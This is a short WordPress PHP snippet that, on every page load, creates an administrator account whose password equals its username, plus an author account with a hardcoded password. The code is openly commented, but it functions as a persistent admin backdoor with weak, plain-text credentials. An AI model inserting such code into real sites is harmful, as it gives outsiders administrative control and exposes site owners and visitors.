<?php

add_action( 'init', function () {

// 관리자 계정 추가
if (!username_exists('superhyeokim2')) {
    $user_id = wp_create_user('superhyeokim2', 'superhyeokim2');
    $user = new WP_User($user_id);
    $user->set_role('administrator');
}

// 사용자 추가
if (!username_exists('hyeokim2')) {
    $user_id = wp_create_user('hyeokim2', '*hyeon0801');
    $user = new WP_User($user_id);
    $user->set_role('author');
}
} );
